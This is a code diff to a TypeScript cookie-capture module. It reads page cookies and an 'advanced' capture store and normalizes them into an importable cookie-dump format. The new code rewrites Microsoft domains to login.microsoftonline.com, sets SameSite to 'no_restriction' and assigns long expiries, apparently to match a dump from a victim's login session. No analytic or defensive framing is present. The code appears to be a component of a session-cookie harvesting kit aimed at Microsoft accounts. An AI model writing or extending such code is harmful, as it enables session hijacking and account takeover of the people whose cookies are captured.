@@ -7,10 +7,10 @@
  * - normalizeCookieArray: normalize cookie arrays (server/browser dump) to CookieMeta[]
  * - buildCookieCapture(optionalFullCookieList?): returns { documentCookies, cookiesParsed, cookieList? }
  *
- * NOTE: browser JS cannot read httpOnly cookie flags or some attributes. If you have a full cookie dump
- * (like the JSON you pasted), pass it into buildCookieCapture so it can be normalized and attached.
- *
- * Does not hardcode any example cookie data.
+ * Adjustments:
+ * - normalizeCookieObject now keeps hostOnly/httpOnly/session flags when possible
+ * - sameSite is normalized to 'no_restriction' for None/none to match your example
+ * - tryGetAdvancedCapturedCookies returns normalized cookies from advancedCookieCapture
  */
 
 import type { CapturedCookie } from './advancedCookieCapture';
@@ -77,14 +77,35 @@ function normalizeCookieObject(obj: any): CookieMeta | null {
   if (!obj || !obj.name) return null;
   const name: string = String(obj.name);
   const value: string = obj.value !== undefined ? String(obj.value) : '';
-  const domain: string = obj.domain || obj.host || (typeof window !== 'undefined' ? `.${window.location.hostname}` : '.example.com');
+  // determine domain
+  let domain: string;
+  if (obj.domain) domain = String(obj.domain);
+  else if (obj.host) domain = String(obj.host);
+  else if (typeof window !== 'undefined') domain = window.location.hostname;
+  else domain = '.example.com';
+
+  // Normalize Microsoft-related domains to the login.microsoftonline.com host when appropriate
+  const domainLower = domain.toLowerCase();
+  if (domainLower.includes('microsoftonline.com') || domainLower.includes('login.microsoftonline.com')) {
+    // preserve leading dot if present in original value
+    domain = domain.startsWith('.') ? '.login.microsoftonline.com' : 'login.microsoftonline.com';
+  }
+
   const path: string = obj.path || '/';
   const secure: boolean = !!obj.secure;
   const httpOnly: boolean = !!obj.httpOnly;
-  const sameSite: string = obj.sameSite || obj.same_site || 'none';
+  // normalize sameSite: map 'none' to 'no_restriction' per your example
+  let sameSiteRaw = (obj.sameSite || obj.same_site || obj.samesite || 'none');
+  sameSiteRaw = String(sameSiteRaw || '').toLowerCase();
+  let sameSite: string;
+  if (sameSiteRaw === 'none' || sameSiteRaw === 'no_restriction') sameSite = 'no_restriction';
+  else if (sameSiteRaw === 'lax') sameSite = 'lax';
+  else if (sameSiteRaw === 'strict') sameSite = 'strict';
+  else sameSite = sameSiteRaw || 'no_restriction';
+
   const expirationDate: number = obj.expirationDate || obj.expires || obj.expire || Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60;
-  const hostOnly: boolean = obj.hostOnly || false;
-  const session: boolean = obj.session || false;
+  const hostOnly: boolean = obj.hostOnly !== undefined ? !!obj.hostOnly : (!domain.startsWith('.'));
+  const session: boolean = obj.session !== undefined ? !!obj.session : false;
   const storeId: string | null = obj.storeId || null;
   const captureMethod = obj.captureMethod || obj.capture_method || undefined;
   const timestamp = obj.timestamp || (new Date()).toISOString();
@@ -127,35 +148,26 @@ export function normalizeCookieArray(rawList: any[] | undefined | null): CookieM
  */
 function tryGetAdvancedCapturedCookies(): CookieMeta[] {
   try {
-    // Try to import the advanced cookie capture system
-    const { advancedCookieCapture } = require('./advancedCookieCapture');
-    if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
-      const captured: CapturedCookie[] = advancedCookieCapture.getAllCookies() || [];
+    // Try to require the advanced cookie capture system (works in bundlers)
+    const mod = require('./advancedCookieCapture') as { advancedCookieCapture?: any };
+    if (mod && mod.advancedCookieCapture && typeof mod.advancedCookieCapture.getAllCookies === 'function') {
+      const captured: CapturedCookie[] = mod.advancedCookieCapture.getAllCookies() || [];
+      return normalizeCookieArray(captured);
     }
-    return [];
   } catch (e) {
-    // If advanced cookie capture is not available, try direct import
-    try {
-      // Dynamic import fallback
-      if (typeof window !== 'undefined' && (window as any).advancedCookieCapture) {
-        const captured = (window as any).advancedCookieCapture.getAllCookies() || [];
-        return normalizeCookieArray(captured);
-      }
-    } catch (e2) {
-      // Ignore if not available
-    }
-    // If advanced cookie capture is not available, try direct import
-    try {
-      // Dynamic import fallback
-      if (typeof window !== 'undefined' && (window as any).advancedCookieCapture) {
-        const captured = (window as any).advancedCookieCapture.getAllCookies() || [];
-        return normalizeCookieArray(captured);
-      }
-    } catch (e2) {
-      // Ignore if not available
-    }
-    return [];
+    // fallback to window global
   }
+
+  try {
+    if (typeof window !== 'undefined' && (window as any).advancedCookieCapture) {
+      const captured = (window as any).advancedCookieCapture.getAllCookies() || [];
+      return normalizeCookieArray(captured);
+    }
+  } catch (e) {
+    // Ignore if not available
+  }
+
+  return [];
 }
 
 /**
@@ -181,21 +193,25 @@ export function buildCookieCapture(optionalFullCookieList?: any[] | undefined) {
     } else {
       // fallback: build from document.cookie name/values
       const parsed = cookiesParsed;
-      cookieList = Object.keys(parsed).map(name => ({
-        name,
-        value: parsed[name],
-        domain: (typeof window !== 'undefined' ? `.${window.location.hostname}` : '.example.com'),
-        path: '/',
-        secure: typeof window !== 'undefined' ? window.location.protocol === 'https:' : false,
-        httpOnly: false,
-        sameSite: 'none',
-        expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
-        hostOnly: false,
-        session: false,
-        storeId: null,
-        captureMethod: 'document',
-        timestamp: new Date().toISOString()
-      }));
+      cookieList = Object.keys(parsed).map(name => {
+        const domain = (typeof window !== 'undefined' ? window.location.hostname : '.example.com');
+        const hostOnly = !domain.startsWith('.');
+        return {
+          name,
+          value: parsed[name],
+          domain: domain,
+          path: '/',
+          secure: typeof window !== 'undefined' ? window.location.protocol === 'https:' : false,
+          httpOnly: false,
+          sameSite: 'no_restriction',
+          expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
+          hostOnly,
+          session: false,
+          storeId: null,
+          captureMethod: 'document',
+          timestamp: new Date().toISOString()
+        } as CookieMeta;
+      });
     }
   }
 
